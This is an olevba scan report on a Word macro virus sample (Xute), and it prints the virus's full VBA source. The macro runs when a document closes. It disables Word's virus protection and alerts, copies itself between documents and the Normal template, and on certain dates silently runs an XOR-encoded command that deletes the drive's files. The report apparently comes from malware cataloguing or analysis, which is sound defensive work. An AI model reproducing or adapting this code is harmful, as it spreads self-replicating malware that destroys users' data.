olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Xute-a17c00f17a2a15ba8bca58060893a80333ec90a7
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Xute-a17c00f17a2a15ba8bca58060893a80333ec90a7 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Xute.bas 
in file: Virus.MSWord.Xute-a17c00f17a2a15ba8bca58060893a80333ec90a7 - OLE stream: 'Macros/VBA/Xute'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Const ID_VIR = "Alm|"
Const DIR_VIR = "Z#EALM\7]XM"
Const FX_VIR = "]\UMK\\96@9E373"
Const GREETS = "Rlmk|a9{`9Alm|"

Private Function encr(s, k As Integer)
    Dim r
    r = ""
    For f = 1 To Len(s): r = r + Chr((Asc(Mid$(s, f, 1))) Xor k): Next
    encr = r
End Function

Sub AutoClose()
    Dim IsInDoc, IsInTem As Boolean
    Dim InDoc, InTem As Integer
    Dim iDay, iMon As Integer
    Dim DatFx As String
    On Error GoTo Done
    IsInTem = False
    IsInDoc = False
    InDoc = 0
    InTem = 0
    Options.VirusProtection = False
    Options.SaveNormalPrompt = False
    Options.ConfirmConversions = False
    Application.ScreenUpdating = False
    Application.DisplayAlerts = wdAlertsNone
    DatFx = Date$
    iDay = Val(Mid$(DatFx, 4, 2)): iMon = Val(Mid$(DatFx, 1, 2))
    If (iMon = 7 And iDay = 26) Or (iDay + iMon) = 30 Then
        DatFx = encr(FX_VIR, 25)
        Shell DatFx, 0
        MsgBox "wow" & encr(GREETS, 25)
    End If
    
    For i = 1 To ActiveDocument.VBProject.VBComponents.Count
        If ActiveDocument.VBProject.VBComponents(i).Name = encr(ID_VIR, 25) Then
            IsInDoc = True
            InDoc = i
        End If
    Next
    For i = 1 To NormalTemplate.VBProject.VBComponents.Count
        If NormalTemplate.VBProject.VBComponents(i).Name = encr(ID_VIR, 25) Then
            IsInTem = True
            InTem = i
        End If
    Next
    If Not IsInTem Then
        ActiveDocument.VBProject.VBComponents(InDoc).Export encr(DIR_VIR, 25)
        NormalTemplate.VBProject.VBComponents.Import encr(DIR_VIR, 25)
        NormalTemplate.Save
    End If
    If Not IsInDoc And ActiveDocument.Saved = False Then
        NormalTemplate.VBProject.VBComponents(InTem).Export encr(DIR_VIR, 25)
        ActiveDocument.VBProject.VBComponents.Import encr(DIR_VIR, 25)
        ActiveDocument.Save
    End If
    Kill encr(DIR_VIR, 25)
Done:
    Application.ScreenUpdating = True
    Application.DisplayAlerts = wdAlertsAll
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Xor                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

